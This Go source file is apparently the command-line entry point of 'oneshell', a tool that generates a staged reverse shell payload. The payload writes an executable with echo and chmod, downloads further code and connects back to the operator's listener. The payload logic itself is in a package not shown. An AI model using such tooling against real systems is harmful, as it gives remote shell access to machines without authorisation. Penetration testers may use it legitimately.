package cmd

import (
	"log"
	"os"

	"github.com/spf13/cobra"
	"github.com/tantosec/oneshell/pkg"
)

var rootCmd = &cobra.Command{
	Use:   "oneshell",
	Short: "Generate a revshell payload using only echo, chmod, and the /tmp directory",
	Long: `Generate a reverse shell payload that requires minimal tools on the target environment.
Specifically, the payload will use the shell's echo command to create an executable file,
use the chmod binary to make it executable, and execute it. From here it will download
additional code allowing the program to download a Golang binary containing the reverse shell.`,
	Run: func(cmd *cobra.Command, args []string) {
		port, err := cmd.Flags().GetUint16("port")
		if err != nil {
			log.Fatal(err)
		}

		target, err := cmd.Flags().GetString("target")
		if err != nil {
			log.Fatal(err)
		}

		if target == "" {
			target, err = pkg.GetMyIP()
			if err != nil {
				log.Fatalf("failed to automatically detect public ip: %v", err)
			}
			log.Println("Target unspecified, using public IP")
		}

		err = pkg.Listen(target, port)
		if err != nil {
			log.Fatalf("error occurred when listening: %v", err)
		}
	},
}

func Execute() {
	err := rootCmd.Execute()
	if err != nil {
		os.Exit(1)
	}
}

func init() {
	rootCmd.Flags().StringP("target", "t", "", "Target IP/hostname for the victim to connect to (this machine). If left blank, will try and identify public IP automatically")
	rootCmd.Flags().Uint16P("port", "p", 443, "Port to listen on")
}
